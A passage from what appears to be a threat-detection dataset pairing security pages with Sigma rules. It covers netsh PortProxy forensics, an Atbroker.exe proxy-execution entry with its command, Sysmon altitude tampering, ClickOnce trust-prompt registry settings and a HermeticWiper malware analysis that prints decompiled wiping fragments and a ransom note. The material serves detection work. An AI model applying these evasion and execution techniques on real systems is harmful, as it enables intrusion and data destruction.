UTC+0000\n\nSubkeys:\n  (S) Control\n  (S) Enum\n  (S) Hardware Profiles\n  (S) Policies\n  (S) services\n\nValues:\nPS C:\\malware> C:\\tools\\volatility_2.6_win64_standalone\\volatility_2.6_win64_standalone.exe -f .\\seven-memdump.mem --profile Win7SP1x86_23418 printkey -K \"ControlSet001\"\n```\n\nAnd despite being in the services folder in the registry keys, it doesn’t show in svcscan -V output as ProxyPort, but instead as “IP Helper” in the NetSvcs.\n\n```\nOffset: 0x7bb828\nOrder: 127\nStart: SERVICE_AUTO_START\nProcess ID: 876\nService Name: iphlpsvc\nDisplay Name: IP Helper\nService Type: SERVICE_WIN32_SHARE_PROCESS\nService State: SERVICE_RUNNING\nBinary Path: C:\\Windows\\system32\\svchost.exe -k netsvcs\nServiceDll: %SystemRoot%\\System32\\iphlpsvc.dll\nImagePath: %SystemRoot%\\System32\\svchost.exe -k NetSvcs\nFailureCommand:\n```\n\nThese are certainly detectable, and can be collected in triage capture as well as in intensive analysis. It’s persistent into Registry but otherwise a little tricky to see outside of the *netsh* environment.\n\n## Refs\n\n1. sc and netsh from: https://securelist.com/blog/research/77403/fileless-attacks-against-enterprise-networks/\n2. MSF module: https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/portproxy.rb\n\nWritten on February 8, 2017",
    "sigma_rule": {
      "title": "New PortProxy Registry Entry Added",
      "id": "a54f842a-3713-4b45-8c84-5f136fdebd3c",
      "status": "test",
      "description": "Detects the modification of the PortProxy registry key which is used for port forwarding.",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
        "https://adepts.of0x.cc/netsh-portproxy-code/",
        "https://www.dfirnotes.net/portproxy_detection/"
      ],
      "author": "Andreas Hunkeler (@Karneades)",
      "date": "2021-06-22",
      "modified": "2024-03-25",
      "tags": [
        "attack.lateral-movement",
        "attack.defense-evasion",
        "attack.command-and-control",
        "attack.t1090"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\Services\\PortProxy\\v4tov4\\tcp\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. https://github.com/microsoft/WSL/issues/4150#issuecomment-504209723)",
        "Synergy Software KVM (https://symless.com/synergy)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_portproxy_registry_key.yml",
    "id": "927"
  },
  {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Atbroker/",
    "markdown": "# /Atbroker.exe\n\n## Execute\n- Execute\n\nHelper binary for Assistive Technology (AT)\n\n### Paths:\n- C:\\Windows\\System32\\Atbroker.exe\n- C:\\Windows\\SysWOW64\\Atbroker.exe\n\n### Resources:\n- http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/\n\n### Detections:\n- Sigma: proc_creation_win_lolbin_susp_atbroker.yml\n- Sigma: registry_event_susp_atbroker_change.yml\n- IOC: Changes to HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\Configuration\n- IOC: Changes to HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\n- IOC: Unknown AT starting C:\\Windows\\System32\\ATBroker.exe /start malware\n\n## Execute\n1. Start a registered Assistive Technology (AT).\n   ```\n   ATBroker.exe /start malware\n   ```\n   - **Use case**: Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistive Technology (AT) service entry.\n   - **Privileges required**: User\n   - **Operating systems**: Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique**: T1218: System Binary Proxy Execution",
    "sigma_rule": {
      "title": "Atbroker Registry Change",
      "id": "9577edbb-851f-4243-8c91-1d5b50c1a39b",
      "status": "test",
      "description": "Detects creation/modification of Assistive Technology applications and persistence with usage of 'at'",
      "references": [
        "http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/",
        "https://lolbas-project.github.io/lolbas/Binaries/Atbroker/"
      ],
      "author": "Mateusz Wydra, oscd.community",
      "date": "2020-10-13",
      "modified": "2023-01-19",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218",
        "attack.persistence",
        "attack.t1547"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": [
            "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs",
            "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\Configuration"
          ]
        },
        "filter_atbroker": {
          "Image": "C:\\Windows\\system32\\atbroker.exe",
          "TargetObject|contains": "\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\Configuration",
          "Details": "(Empty)"
        },
        "filter_uninstallers": {
          "Image|startswith": "C:\\Windows\\Installer\\MSI",
          "TargetObject|contains": "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs"
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Creation of non-default, legitimate at usage"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_susp_atbroker_change.yml",
    "id": "930"
  },
  {
    "url": "https://posts.specterops.io/shhmon-silencing-sysmon-via-driver-unload-682b5be57650",
    "markdown": "",
    "sigma_rule": {
      "title": "Sysmon Driver Altitude Change",
      "id": "4916a35e-bfc4-47d0-8e25-a003d7067061",
      "status": "test",
      "description": "Detects changes in Sysmon driver altitude value.\nIf the Sysmon driver is configured to load at an altitude of another registered service, it will fail to load at boot.\n",
      "references": [
        "https://posts.specterops.io/shhmon-silencing-sysmon-via-driver-unload-682b5be57650",
        "https://youtu.be/zSihR3lTf7g"
      ],
      "author": "B.Talebi",
      "date": "2022-07-28",
      "modified": "2024-03-25",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\Services\\",
          "TargetObject|endswith": "\\Instances\\Sysmon Instance\\Altitude"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate driver altitude change to hide sysmon"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_change_sysmon_driver_altitude.yml",
    "id": "934"
  },
  {
    "url": "https://learn.microsoft.com/en-us/visualstudio/deployment/how-to-configure-the-clickonce-trust-prompt-behavior",
    "markdown": "# Configure the ClickOnce trust prompt behavior\n\nYou can configure the ClickOnce trust prompt to control whether end users are given the option of installing ClickOnce applications, such as Windows Forms applications, Windows Presentation Foundation applications, console applications, WPF browser applications, and Office solutions. You configure the trust prompt by setting registry keys on each end user's computer.\n\nThe following table shows the configuration options that can be applied to each of the five zones (Internet, UntrustedSites, MyComputer, LocalIntranet, and TrustedSites).\n\n| Option                       | Registry setting value | Description                                                                                          |\n|------------------------------|------------------------|------------------------------------------------------------------------------------------------------|\n| Enable the trust prompt.     | `Enabled`              | The ClickOnce trust prompt is displayed so that end users can grant trust to ClickOnce applications. |\n| Restrict the trust prompt.   | `AuthenticodeRequired` | The ClickOnce trust prompt is only displayed if ClickOnce applications are signed with a certificate that identifies the publisher. Otherwise, the ClickOnce application won't be installed. |\n| Disable the trust prompt.    | `Disabled`             | The ClickOnce trust prompt isn't displayed. Only ClickOnce applications that are signed with an explicitly trusted certificate will be installed. |\n\nThe following table shows the default behavior for each zone. The Applications column refers to Windows Forms applications, Windows Presentation Foundation applications, WPF browser applications, and console applications.\n\n| Zone            | Applications | Office solutions      |\n|-----------------|--------------|-----------------------|\n| `MyComputer`    | `Enabled`    | `Enabled`             |\n| `LocalIntranet` | `Enabled`    | `Enabled`             |\n| `TrustedSites`  | `Enabled`    | `Enabled`             |\n| `Internet`      | `Enabled`    | `AuthenticodeRequired`|\n| `UntrustedSites`| `Disabled`   | `Disabled`            |\n\nYou can override these settings by enabling, restricting, or disabling the ClickOnce trust prompt.\n\n## Enable the ClickOnce trust prompt\n\nEnable the trust prompt for a zone when you want end users to be presented with the option of installing and running any ClickOnce application that comes from that zone.\n\n### To enable the ClickOnce trust prompt by using the registry editor\n\n1. Open the registry editor:\n   1. Click **Start**, and then click **Run**.\n   2. In the **Open** box, type `regedit`, and then click **OK**.\n2. Find the following registry key:\n   **\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MICROSOFT\\.NETFramework\\Security\\TrustManager\\PromptingLevel**\n   If the key doesn't exist, create it.\n3. Add the following subkeys as **String Value**, if they don't already exist, with the associated values shown in the following table.\n\n| String Value subkey | Value       |\n|---------------------|-------------|\n| `Internet`          | `Enabled`   |\n| `UntrustedSites`    | `Disabled`  |\n| `MyComputer`        | `Enabled`   |\n| `LocalIntranet`     | `Enabled`   |\n| `TrustedSites`      | `Enabled`   |\n\nFor Office solutions, `Internet` has the default value `AuthenticodeRequired` and `UntrustedSites` has the value `Disabled`. For all others, `Internet` has the default value `Enabled`.\n\n### To enable the ClickOnce trust prompt programmatically\n\n1. Create a Visual Basic or Visual C# console application in Visual Studio.\n2. Open the `Program.vb` or `Program.cs` file for editing and add the following code.\n\n#### C#\n\n```\nMicrosoft.Win32.RegistryKey key;\nkey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(\"SOFTWARE\\\\MICROSOFT\\\\.NETFramework\\\\Security\\\\TrustManager\\\\PromptingLevel\");\nkey.SetValue(\"MyComputer\", \"Enabled\");\nkey.SetValue(\"LocalIntranet\", \"Enabled\");\nkey.SetValue(\"Internet\", \"AuthenticodeRequired\");\nkey.SetValue(\"TrustedSites\", \"Enabled\");\nkey.SetValue(\"UntrustedSites\", \"Disabled\");\nkey.Close();\n```\n\n#### VB\n\n```\nDim key As Microsoft.Win32.RegistryKey\nkey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(\"SOFTWARE\\MICROSOFT\\.NETFramework\\Security\\TrustManager\\PromptingLevel\")\nkey.SetValue(\"MyComputer\", \"Enabled\")\nkey.SetValue(\"LocalIntranet\", \"Enabled\")\nkey.SetValue(\"Internet\", \"Enabled\")\nkey.SetValue(\"TrustedSites\", \"Enabled\")\nkey.SetValue(\"UntrustedSites\", \"Disabled\")\nkey.Close()\n```\n\n3. Build and run the application.\n\n## Restrict the ClickOnce trust prompt\n\nRestrict the trust prompt so that solutions must be signed with Authenticode certificates that have known identity before users are prompted for a trust decision.\n\n### To restrict the ClickOnce trust prompt by using the registry editor\n\n1. Open the registry editor:\n   1. Click **Start**, and then click **Run**.\n   2. In the **Open** box, type `regedit`, and then click **OK**.\n2. Find the following registry key:\n   **\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MICROSOFT\\.NETFramework\\Security\\TrustManager\\PromptingLevel**\n   If the key doesn't exist, create it.\n3. Add the following subkeys as **String Value**, if they don't already exist, with the associated values shown in the following table.\n\n| String Value subkey | Value                |\n|---------------------|----------------------|\n| `UntrustedSites`    | `Disabled`           |\n| `Internet`          | `AuthenticodeRequired`|\n| `MyComputer`        | `AuthenticodeRequired`|\n| `LocalIntranet`     | `AuthenticodeRequired`|\n| `TrustedSites`      | `AuthenticodeRequired`|\n\n### To restrict the ClickOnce trust prompt programmatically\n\n1. Create a Visual Basic or Visual C# console application in Visual Studio.\n2. Open the `Program.vb` or `Program.cs` file for editing and add the following code.\n\n#### C#\n\n```\nMicrosoft.Win32.RegistryKey key;\nkey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(\"SOFTWARE\\\\MICROSOFT\\\\.NETFramework\\\\Security\\\\TrustManager\\\\PromptingLevel\");\nkey.SetValue(\"MyComputer\", \"AuthenticodeRequired\");\nkey.SetValue(\"LocalIntranet\", \"AuthenticodeRequired\");\nkey.SetValue(\"Internet\", \"AuthenticodeRequired\");\nkey.SetValue(\"TrustedSites\", \"AuthenticodeRequired\");\nkey.SetValue(\"UntrustedSites\", \"Disabled\");\nkey.Close();\n```\n\n#### VB\n\n```\nDim key As Microsoft.Win32.RegistryKey\nkey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(\"SOFTWARE\\MICROSOFT\\.NETFramework\\Security\\TrustManager\\PromptingLevel\")\nkey.SetValue(\"MyComputer\", \"AuthenticodeRequired\")\nkey.SetValue(\"LocalIntranet\", \"AuthenticodeRequired\")\nkey.SetValue(\"Internet\", \"AuthenticodeRequired\")\nkey.SetValue(\"TrustedSites\", \"AuthenticodeRequired\")\nkey.SetValue(\"UntrustedSites\", \"Disabled\")\nkey.Close()\n```\n\n3. Build and run the application.\n\n## Disable the ClickOnce trust prompt\n\nYou can disable the trust prompt so that end users aren't given the option to install solutions that aren't already trusted in their security policy.\n\n### To disable the ClickOnce trust prompt by using the registry editor\n\n1. Open the registry editor:\n   1. Click **Start**, and then click **Run**.\n   2. In the **Open** box, type `regedit`, and then click **OK**.\n2. Find the following registry key:\n   **\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MICROSOFT\\.NETFramework\\Security\\TrustManager\\PromptingLevel**\n   If the key doesn't exist, create it.\n3. Add the following subkeys as **String Value**, if they don't already exist, with the associated values shown in the following table.\n\n| String Value subkey | Value    |\n|---------------------|----------|\n| `UntrustedSites`    | `Disabled`|\n| `Internet`          | `Disabled`|\n| `MyComputer`        | `Disabled`|\n| `LocalIntranet`     | `Disabled`|\n| `TrustedSites`      | `Disabled`|\n\n### To disable the ClickOnce trust prompt programmatically\n\n1. Create a Visual Basic or Visual C# console application in Visual Studio.\n2. Open the `Program.vb` or `Program.cs` file for editing and add the following code.\n\n#### C#\n\n```\nMicrosoft.Win32.RegistryKey key;\nkey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(\"SOFTWARE\\\\MICROSOFT\\\\.NETFramework\\\\Security\\\\TrustManager\\\\PromptingLevel\");\nkey.SetValue(\"MyComputer\", \"Disabled\");\nkey.SetValue(\"LocalIntranet\", \"Disabled\");\nkey.SetValue(\"Internet\", \"Disabled\");\nkey.SetValue(\"TrustedSites\", \"Disabled\");\nkey.SetValue(\"UntrustedSites\", \"Disabled\");\nkey.Close();\n```\n\n#### VB\n\n```\nDim key As Microsoft.Win32.RegistryKey\nkey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(\"SOFTWARE\\MICROSOFT\\.NETFramework\\Security\\TrustManager\\PromptingLevel\")\nkey.SetValue(\"MyComputer\", \"Disabled\")\nkey.SetValue(\"LocalIntranet\", \"Disabled\")\nkey.SetValue(\"Internet\", \"Disabled\")\nkey.SetValue(\"TrustedSites\", \"Disabled\")\nkey.SetValue(\"UntrustedSites\", \"Disabled\")\nkey.Close()\n```\n\n3. Build and run the application.\n\n## Related content\n\n- Secure ClickOnce applications\n- Code access security for ClickOnce applications\n- ClickOnce and Authenticode\n- Trusted application deployment overview\n- Enable and configure ClickOnce security settings\n- Set a security zone for a ClickOnce application\n- Set custom permissions for a ClickOnce application\n- Debug a ClickOnce application with restricted permissions\n- Add a trusted publisher to a client computer for ClickOnce applications\n- Re-sign application and deployment manifests",
    "sigma_rule": {
      "title": "ClickOnce Trust Prompt Tampering",
      "id": "ac9159cc-c364-4304-8f0a-d63fc1a0aabb",
      "status": "test",
      "description": "Detects changes to the ClickOnce trust prompt registry key in order to enable an installation from different locations such as the Internet.",
      "references": [
        "https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5",
        "https://learn.microsoft.com/en-us/visualstudio/deployment/how-to-configure-the-clickonce-trust-prompt-behavior"
      ],
      "author": "@SerkinValery, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-06-12",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\SOFTWARE\\MICROSOFT\\.NETFramework\\Security\\TrustManager\\PromptingLevel\\",
          "TargetObject|endswith": [
            "\\Internet",
            "\\LocalIntranet",
            "\\MyComputer",
            "\\TrustedSites",
            "\\UntrustedSites"
          ],
          "Details": "Enabled"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate internal requirements."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_clickonce_trust_prompt.yml",
    "id": "937"
  },
  {
    "url": "https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/",
    "markdown": "# HermeticWiper | New Destructive Malware Used In Cyber Attacks on Ukraine\n\n**Date:** February 23, 2022\n\n**This post was updated Feb 28th 2022 to include new IOCs and the PartyTicket ‘decoy ransomware’.**\n\n## Executive Summary\n\n- On February 23rd, the threat intelligence community began observing a new wiper malware sample circulating in Ukrainian organizations.\n- Our analysis shows a signed driver is being used to deploy a wiper that targets Windows devices, manipulating the MBR resulting in subsequent boot failure.\n- This blog includes the technical details of the wiper, dubbed HermeticWiper, and includes IOCs to allow organizations to stay protected from this attack.\n- This sample is actively being used against Ukrainian organizations, and this blog will be updated as more information becomes available.\n- We also analyze a ‘ransomware’, called PartyTicket, reportedly used as a decoy during wiping operations.\n- SentinelOne customers are protected from this threat, no action is needed.\n\n## Background\n\nOn February 23rd, our friends at Symantec and ESET research tweeted hashes associated with a wiper attack in Ukraine, including one which is not publicly available as of this writing.\n\n```image\nAlt: ESET Tweet\nDescription: The image displays a tweet from ESET research regarding the ongoing analysis of a cyber attack involving HermeticWiper malware. It includes text about the developing story and mentions indicators of compromise (IoC) such as specific hashes and a reference to a trojan (Win32/KillDisk.NCV). The tweet is dated February 23, 2022, and provides key information relevant to the cyber threat landscape.\nTranscription: |\n  ESET research\n  @ESETresearch\n  \n  This is a developing story and we will be making updates as we discover new data points.\n  IoC:\n  912342F1C840A42F6B74132F8A7C4FFE7D40FB77\n  61B25D11392172E587D8DA3045812A66C3385451\n  Win32/KillDisk.NCV trojan 6/n\n  \n  3:25 PM · Feb 23, 2022 · Twitter Web App\n```\n\nWe started analyzing this new wiper malware, calling it ‘HermeticWiper’ in reference to the digital certificate used to sign the sample. The digital certificate is issued under the company name ‘Hermetica Digital Ltd’ and valid as of April 2021. At this time, we haven’t seen any legitimate files signed with this certificate. It’s possible that the attackers used a shell company or appropriated a defunct company to issue this digital certificate.\n\n```image\nAlt: HermeticWiper Digital Signature\nDescription: The image displays detailed information regarding the digital signature verification of a file associated with the HermeticWiper malware. It includes the status of the signature verification, indicating that the file is signed and has a valid signature. Furthermore, it lists the signer's details, namely 'Hermetica Digital Ltd,' and provides specifics such as the valid date range for the signature, the issuer, and algorithm used (sha256RSA). Additional information includes the thumbprint and serial number of the certificate.\nTranscription: |\n  Signature Verification\n  \n  ✅ Signed file, valid signature\n  \n  File Version Information\n  \n  Signers\n  \n    Hermetica Digital Ltd\n      Name                Hermetica Digital Ltd\n      Status              Valid\n      Issuer              DigiCert EV Code Signing CA (SHA2)\n      Valid From          12:00 AM 04/13/2021\n      Valid To            11:59 PM 04/14/2022\n      Valid Usage         Code Signing\n      Algorithm           sha256RSA\n      Thumbprint          1AE7556DFACD47D9EFBE79BE974661A5A6D6D923\n      Serial Number       0C 48 73 28 73 AC 8C CE BA F8 F0 E1 E8 32 9C EC\n```\n\n*HermeticWiper Digital Signature*\n\nThis is an early effort to analyze the first available sample of HermeticWiper. We recognize that the situation on the ground in Ukraine is evolving rapidly and hope that we can contribute our small part to the collective analysis effort.\n\n## Technical Analysis\n\nAt first glance, HermeticWiper appears to be a custom-written application with very few standard functions. The malware sample is 114KBs in size and roughly 70% of that is composed of resources. The developers are using a tried and tested technique of wiper malware, abusing a benign partition management driver, in order to carry out the more damaging components of their attacks. Both the Lazarus Group (Destover) and APT33 (Shamoon) took advantage of Eldos Rawdisk in order to get direct userland access to the filesystem without calling Windows APIs. HermeticWiper uses a similar technique by abusing a different driver, `empntdrv.sys`.\n\n```image\nAlt: HermeticWiper resources containing EaseUS Partition Manager drivers\nDescription: The image displays a technical analysis of resources associated with the HermeticWiper malware. It lists several entries categorized as 'RCDATA' along with their respective sizes and IDs. The entries include sizes like 11119, 9904, 10956, 9626, and identifiers such as DRV_X64, DRV_X86, and DRV_XP_X64, indicating different driver versions or types. This information is relevant to understanding the structure and components of the malware.\nTranscription: |\n  Type    Size   ID Name\n  RCDATA  11119  0  DRV_X64\n  RCDATA  9904   0  DRV_X86\n  RCDATA  10956  0  DRV_XP_X64\n  RCDATA  9626   0  DRV_XP_X86\n```\n\n*HermeticWiper resources containing EaseUS Partition Manager drivers*\n\nThe copies of the driver are ms-compressed resources. The malware deploys one of these depending on the OS version, bitness, and SysWow64 redirection.\n\n```image\nAlt: EaseUS driver resource selection\nDescription: The image displays a snippet of code related to the HermeticWiper malware. It prominently features various function calls and conditional statements, specifically dealing with resource management and version verification for different Windows processes (WOW64). The code exemplifies how the malware handles resources based on the operating system architecture (64-bit vs 32-bit), suggesting its method of selecting appropriate drivers for its operation. This technical detail aligns with the analysis of the malware's functionality and tactics.\n```\n\n*EaseUS driver resource selection*\n\nThe benign EaseUS driver is abused to do a fair share of the heavy-lifting when it comes to accessing Physical Drives directly as well as getting partition information. This adds to the difficulty of analyzing HermeticWiper, as a lot of functionality is deferred to `DeviceIoControl` calls with specific IOCTLs.\n\n### MBR and Partition Corruption\n\nHermeticWiper enumerates a range of Physical Drives multiple times, from 0-100. For each Physical Drive, the `\\\\.\\EPMNTDRV\\` device is called for a device number.\n\n```image\nAlt: Physical Drive\nDescription: The image depicts a snippet of programming code, likely related to the HermeticWiper malware. It shows a function that utilizes the 'wnsprintf' function to format a string that likely represents a physical drive identifier. The code includes parameters for creating a device number and accessing physical drives, which aligns with the malware's functionality of corrupting Master Boot Records (MBR) and partitions. The formatting suggests that the malware enumerates physical drives, indicating its destructive capabilities.\nTranscription: |\n  c\n  v29 = 0;\n  *( _QWORD *)dwBytes = 0i64;\n  wnsprintfW(pszDest, 260, L\"\\\\\\\\.\\\\PhysicalDrive%u\", index_to_100);\n  DeviceNumber = createPipe_GetDeviceNumber(pszDest, (int)&v25, (int)v24);\n  v6 = (void *)DeviceNumber;\n  if ( DeviceNumber != -1 )\n  {\n      if ( !DeviceNumber )\n          return 0;\n      v7 = 9408;\n      ProcessHeap = GetProcessHeap();\n```\n\nThe malware then focuses on corrupting the first 512 bytes, the Master Boot Record (MBR) for every Physical Drive. While that should be enough for the device not to boot again, HermeticWiper proceeds to enumerate the partitions for all possible drives.\n\nThey then differentiate between FAT and NTFS partitions. In the case of a FAT partition, the malware calls the same ‘bit fiddler’ to corrupt the partition. For NTFS, the HermeticWiper parses the Master File Table before calling this same bit fiddling function again.\n\n```image\nAlt: MFT parsing and bit fiddling calls\nDescription: The image shows a section of source code related to the HermeticWiper malware. The code appears to involve functions for interacting with the NTFS Master File Table and generating random data, likely for corrupting files. It includes variable assignments and calls to cryptographic functions, indicating its role in the malware's operations for damaging data and system functionality.\nTranscription: |\n  c\n  else\n  {\n      result = looking_for_FILE_in_NTFS_MasterFileTable(a5, SHIDWORD(a5), v20);\n      v16 = result;\n      if ( result )\n      {\n          v6 = *(unsigned __int16 *)(a2 + 11) * *(unsigned __int8 *)(a2 + 13);\n          v14 = *(unsigned __int16 *)(a2 + 11);\n          v13 = v22;\n          v12 = v21;\n          LODWORD(v7) = _allmul_1_0(*(_DWORD *)(a2 + 48), *(_DWORD *)(a2 + 52), v6, 0);\n          crypto_here_generateRandomData_bitFiddler(a4, a3, a5 + v7, (unsigned __int64)(a5 + v7) >> 32, v12, v13, v14, v6);\n          v15 = *(unsigned __int16 *)(a2 + 11);\n          LODWORD(v8) = _allmul_1_0(*(_DWORD *)(a2 + 60), v6, 0);\n          crypto_here_generateRandomData_bitFiddler(a4, a3, a5 + v8, (unsigned __int64)(a5 + v8) >> 32, v6, 0, v15, v6);\n          return v16;\n      }\n  }\n```\n\n*MFT parsing and bit fiddling calls*\n\nWe euphemistically refer to the bit fiddling function in the interest of brevity. Looking through it, we see calls to Windows APIs to acquire a cryptographic context provider and generate random bytes. It’s likely this is being used for an inlined crypto implementation and byte overwriting, but the mechanism isn’t entirely clear at this time.\n\nFurther functionality refers to interesting MFT fields (`$bitmap`, `$logfile`) and NTFS streams (`$DATA`, `$I30`, `$INDEX_ALLOCATION`). The malware also enumerates common folders (‘My Documents’, ‘Desktop’, ‘AppData’), makes references to the registry (‘ntuser’), and Windows Event Logs (`\"\\\\?\\\\C:\\\\Windows\\\\System32\\\\winevt\\\\Logs\"`). Our analysis is ongoing to determine how this functionality is being used, but it is clear that having already corrupted the MBR and partitions for all drives, the victim system should be inoperable by this point of the execution.\n\nAlong the way, HermeticWiper’s more mundane operations provide us with further IOCs to monitor for. These include the momentary creation of the abused driver as well as a system service. It also modifies several registry keys, including setting the `SYSTEM\\CurrentControlSet\\Control\\CrashControl CrashDumpEnabled` key to **0**, effectively disabling crash dumps before the abused driver’s execution starts.\n\n```image\nAlt: Disabling CrashDumps via the registry\nDescription: The image displays a piece of code related to Windows Registry manipulation. It shows a function likely aimed at disabling crash dumps by modifying the registry key `CrashDumpEnabled` under `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CrashControl`. The code snippet includes variable declarations, a check to open the registry key, and a command to set the value of `CrashDumpEnabled` to `0`, effectively disabling crash dumps on the system. This is relevant to the context of the HermeticWiper malware's functionality.\nTranscription: |\n  c\n  Wow64DisableWow64FsRedirection((PVOID *)&v31);\n  phkResult = 0;\n  if ( !RegOpenKeyW(HKEY_LOCAL_MACHINE, L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\CrashControl\", &phkResult) )\n  {\n      *(_DWORD *)Data = 0;\n      RegSetValueExW(phkResult, L\"CrashDumpEnabled\", 0, 4u, Data, 4u); // LSTATUS RegSetValueExW(\n                                                                      // [in]        HKEY    hKey,\n```\n\n*Disabling CrashDumps via the registry*\n\nFinally, the malware waits on sleeping threads before initiating a system shutdown, finalizing the malware’s devastating effect.\n\n## A Decoy Ransomware – PartyTicket\n\nOn February 24th, 2022, Symantec researchers pointed to a new Go ransomware being used as a decoy alongside the deployment of HermeticWiper. During our analysis we decided to name it PartyTicket based on some of the strings used by the malware developers:\n\n```image\nAlt: PartyTicket\nDescription: The image features a snippet of code displayed on a blue background, likely representing a part of the malware named 'PartyTicket.' The code includes various symbols and text, with a prominent focus on the term 'partyTicket.len' enclosed in a light-colored box. The overall aesthetic resembles that of a programming environment or terminal output, suggesting it is part of the analysis of the malware's functionality.\n```\n\nThe idea of using a ransomware as a decoy for a wiper is counterintuitive. In particular, a ransomware as poorly coded as PartyTicket is more likely to tie up resources during the execution of an otherwise efficient wiper.\n\nAs often happens to amateur Go developers, the malware has poor control over its concurrent threads and the commands it attempts to run. This leads to hundreds of threads and events spawned in our consoles. That is to say, it’s a very loud and ineffective ransomware that should fire alerts left and right.\n\nThe folder organization and function naming conventions within the binary show the developer’s intent for taunting the U.S. Government and the Biden administration.\n\n```image\nAlt: Project folders and function names referring to the Biden Administration\nDescription: The image displays a console output showing a list of project folder paths and function names related to the malware PartyTicket. The paths include a directory structure containing names that mock the Biden administration, with functions like 'primaryElectionProcess' and 'GoodOffice1' listed. The formatting emphasizes the satire involved in the malware's design, particularly in relation to U.S. politics.\n```\n\n*Project folders and function names referring to the Biden Administration*\n\nSimilar taunting can be found in the ransom note after execution:\n\n```image\nAlt: Ransom Note\nDescription: The image depicts a ransom note associated with the PartyTicket ransomware. The note features a sarcastic message referencing elections, indicating that all user files have been encrypted. It instructs the victim not to attempt decryption themselves and provides a special ID for the compromised computer. Additionally, it includes contact information for the attackers and emphasizes the importance of not sending sensitive files. The layout is straightforward, with clear sections for instructions and contact details.\nTranscription: |\n  \"The only thing that we learn from new elections is we learned nothing from the old!\"\n  \n  ---\n  \n  Thank you for your vote! All your files, documents, photoes, videos, databases etc. have been successfully encrypted!\n  \n  Now your computer has a special ID: [redacted]\n  \n  ---\n  \n  Do not try to decrypt then by yourself - it's impossible!\n  \n  It's just a business and we care only about getting benefits. The only way to get your files back is to contact us and get further instuctions.\n  \n  To prove that we have a decryptor send us any encrypted file (less than 650 kbytes) and we'll send you it back being decrypted. This is our guarantee.\n  \n  NOTE: Do not send file with sensitive content. In the email write us your computer's special ID (mentioned above).\n  \n  ---\n  \n  So if you want to get your files back contact us:\n  \n  1) vote[redacted]@protonmail.com\n  \n  2) st[redacted]2024@protonmail.com - if we don't answer you during 3 days\n  \n  ---\n  \n  Have a nice day!\n```\n\nIn trying to understand the execution flow of PartyTicket, we see the `403forBiden.wHiteHousE.primaryElectionProcess()` function recursively enumerating folders:\n\n```image\nAlt: PartyTicket looping over non-system folders\nDescription: The image displays a snippet of code, likely written in Go, showcasing functions and variable declarations relevant to the PartyTicket malware. It includes references to directory names and conditions for string containment checks, specifically mentioning 'Windows' and 'Program Files.' The code appears to be part of the malware's logic for traversing directories, with an emphasis on taunting references to the Biden administration, aligning with the narrative of the malware being poorly coded and inefficient.\nTranscription: |\n  c\n  v35 = v2;\n  f_itab = v2[1];\n  f_data = v2[11];\n  f_n_len = *(_QWORD *)substr;\n  f_n_ptr = (uint8_t *)(*(_int64 (__golang **)(uint8_t *))(f_itab + 6))(f_data);\n  dirname.str = f_n_ptr;\n  dirname.len = *(_QWORD *)substr;\n  substra.str = (uint8_t *)\"Windows\";\n  substra.len = 7LL;\n  if ( !strings_Contains(dirname, substra) )\n  {\n      dirnamea.str = f_n_ptr;\n      dirnamea.len = f_n_len;\n      substrb.str = (uint8_t *)\"Program Files\";\n      substrb.len = 13LL;\n      if ( !strings_Contains(dirnamea, substrb) )\n      {\n          if ( 